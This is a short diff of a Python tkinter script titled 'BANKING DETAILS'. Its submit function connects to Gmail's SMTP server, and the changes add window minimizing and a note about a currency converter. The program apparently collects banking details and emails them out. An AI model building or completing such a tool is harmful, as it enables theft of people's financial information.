@@ -12,7 +12,7 @@ window.title("BANKING DETAILS")
 window.geometry("500x300")
 window.config(bg="grey")
 window.resizable(0, 0)
-
+window.wm_iconify()
 
 def submit():
     s = smtplib.SMTP('smtp.gmail.com', 587)
@@ -30,7 +30,8 @@ def submit():
 
 
 def function():
-    window.destroy()
+    messagebox.showinfo("NOTE", "Please Use UpperCase When Selecting Currencies!!")
+    window.iconify()
     import Convert
 
 
